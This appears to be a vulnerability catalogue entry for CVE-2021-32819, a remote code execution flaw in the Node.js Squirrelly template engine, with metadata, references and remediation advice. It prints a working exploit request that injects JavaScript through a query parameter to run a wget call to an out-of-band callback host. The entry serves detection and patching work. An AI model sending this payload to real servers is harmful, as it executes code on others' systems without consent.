---
layout: post
cve_id: CVE-2021-32819
title: Nodejs Squirrelly - Remote Code Execution
pcap: true
pcap_path: /pcaps/2021/CVE-2021-32819.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-32819.yaml
snort2_rule: N/A
snort3_rule: N/A
author: pikpikcu
severity: high
impact: 'Successful exploitation of this vulnerability could allow an attacker to
  execute arbitrary code on the affected system.

  '
remediation: 'Update to the latest version of Nodejs Squirrelly template engine to
  mitigate the vulnerability.

  '
reference:
- https://securitylab.github.com/advisories/GHSL-2021-023-squirrelly/
- https://www.linuxlz.com/aqld/2331.html
- https://blog.diefunction.io/vulnerabilities/ghsl-2021-023
- https://nvd.nist.gov/vuln/detail/CVE-2021-32819
- https://github.com/squirrellyjs/squirrelly/commit/c12418a026f73df645ba927fd29358efe02fed1e
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
  cvss-score: 8.8
  cve-id: CVE-2021-32819
  cwe-id: CWE-200,NVD-CWE-noinfo
  epss-score: 0.88448
  epss-percentile: 0.99475
  cpe: cpe:2.3:a:squirrelly:squirrelly:8.0.8:*:*:*:*:*:*:*
metadata:
  max-request: 1
  vendor: squirrelly
  product: squirrelly
tags:
- cve2021
- cve
- nodejs
- rce
- oast
- squirrelly
- vkev
- vuln
---

## üîç Vulnerability Description
Nodejs Squirrelly is susceptible to remote code execution. Squirrelly is a template engine implemented in JavaScript that works out of the box with ExpressJS. Squirrelly mixes pure template data with engine configuration options through the Express render API. By overwriting internal configuration options remote code execution may be triggered in downstream applications. There is currently no fix for these issues as of the publication of this CVE. The latest version of squirrelly is currently 8.0.8. For complete details refer to the referenced GHSL-2021-023.


## üåê HTTP Request
```nohighlight
GET /?Express=aaaa&autoEscape&defaultFilter=e%27);var+require=global.require+%7C%7C+global.process.mainModule.constructor._load;+require(%27child_process%27).exec(%27wget%20http://d5jnrc9le0o41333gpigsa8u7x4z6szx8.oast.pro%27);// HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

